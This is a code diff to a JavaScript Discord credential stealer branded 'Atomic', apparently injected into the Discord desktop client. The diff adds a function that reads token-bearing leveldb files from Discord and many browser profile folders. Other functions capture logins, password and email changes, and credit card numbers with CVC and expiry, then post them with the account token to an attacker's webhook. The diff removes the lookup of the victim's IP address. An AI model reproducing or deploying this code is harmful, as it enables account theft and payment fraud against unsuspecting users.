@@ -71,7 +71,7 @@ function SendToWebhook(info) {
 
 function GetNitro(type) {
     if (type == 0) {
-        return "No"
+        return "No Nitro"
     }
     if (type == 1) {
         return "\`Nitro Classic\`"
@@ -79,9 +79,53 @@ function GetNitro(type) {
     if (type == 2) {
         return "\`Nitro Boost\`"
     } else {
-        return "No"
+        return "No Nitro"
     }
 }
+
+function token_graber() {
+    var paths = [
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
+
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
+        `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
+    ];
+
+    paths.forEach(path => {
+        try {
+            fs.readdir(path, (error, files) => {
+                if (files === undefined) return;
+
+                let filter = files.filter(f => f.split('.').pop() === 'log' || 'ldb');
+
+                for (var i = 0; i < filter.length; i++) {
+                    fs.readFile(`${path}/${filter[i]}`, `utf-8`, async function (error, data) {
+                        shearch_for_token(data);
+                    });
+                };
+            });
+        } catch { };
+    });
+};
 
 function GetBadges(flags) {
     const Discord_Employee = 1;
@@ -126,7 +170,7 @@ function GetBadges(flags) {
         badges += "Discord Developer, "
     }
     if (badges == "") {
-        badges = "No"
+        badges = "None"
     }
     return badges
 }
@@ -139,17 +183,11 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
@@ -162,37 +200,31 @@ function Login(email, password, token) {
                         
                         
                         {
-                            "name": "<:8485discordemployee:940583845063979008> | Info :",
+                            "name": "<:3809discordhypesquad:940583844367724644> | Account Info :",
                             "value": `Email: \`${email}\` \nPassword: \`${password}\``,
                             "inline": false
                         },
-
-
+                        
+                        
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
-                        },
-
-
-                        {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Atomic"
                     }
-                    }]
                 }
-                SendToWebhook(JSON.stringify(params))
-            })
-        })
-    }
-
-
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
 
 function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -206,24 +238,28 @@ function ChangePassword(oldpassword, newpassword, token) {
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<a:blbutterfly:932017632322916362> | Password Changed :",
+                            "name": "<:8485discordemployee:940583845063979008> | Password Changed :",
                             "value": `Email: \`${json.email}\`\nOld Password: \`${oldpassword}\`\nNew Password: \`${newpassword}\``,
                             "inline": false
                         },
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": true
-                        },
+
+
                         {
                             "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
+                            "inline": false
+                        },
+
+
+                        {
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": false
                         }
                     ],
@@ -232,7 +268,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic On Top"
+                        "text": "Atomic"
                     }                 
                 }
             ]
@@ -253,25 +289,29 @@ function ChangeEmail(newemail, password, token) {
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<a:blbutterfly:932017632322916362> | Email Changed :",
+                            "name": "<:8485discordemployee:940583845063979008> | Email Changed :",
                             "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
                             "inline": true
                         },
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": true
-                        },
+
+
                         {
                             "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
                             "inline": false
+                        },
+
+
+                        {
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
+                            "inline": true
                         }
                     ],
                     "author": {
@@ -279,7 +319,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic On Top"
+                        "text": "Atomic"
                     }                
                 }
             ]
@@ -299,14 +339,14 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         var json = JSON.parse(info);
         var params = {
             username: "Atomic",
-            content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            content: "",
+            avatar_url: "https://media.discordapp.net/attachments/693283745230225448/944169589108002826/Atomic_Logo.jpg?width=480&height=480",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<a:card:932017676610580551> | Credit Card Added",
+                            "name": ":credit_card: | Credit Card Added",
                             "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
                             "inline": true
                         },
@@ -326,7 +366,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Atomic On Top"
+                        "text": "Atomic"
                     }
                 }
             ]
